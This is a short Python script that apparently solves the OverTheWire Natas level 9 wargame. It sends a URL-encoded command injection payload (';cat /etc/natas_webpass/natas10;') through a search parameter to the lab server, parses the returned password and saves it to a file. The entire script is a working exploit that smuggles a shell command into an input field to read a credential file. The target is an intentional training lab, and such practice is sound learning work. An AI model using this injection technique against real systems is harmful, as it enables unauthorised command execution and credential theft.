import requests, re

url="http://natas9.natas.labs.overthewire.org/"
username="natas9"
# read password from generated file
file=open('password.txt', 'r')
password=file.read()

# RCE payload
# ;cat /etc/natas_webpass/natas9
payload='?needle=%3Bcat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B&submit=Search'
req=requests.get(url+payload, auth=(username, password)).text
# print(req)

# Parse password
pattern=r'(?<=<pre>\n)(.*)(?=\n</pre>)'
password=re.search(pattern, req, re.DOTALL).group(1)
print(password)
with open('password.txt', 'w') as f:
    f.write(password)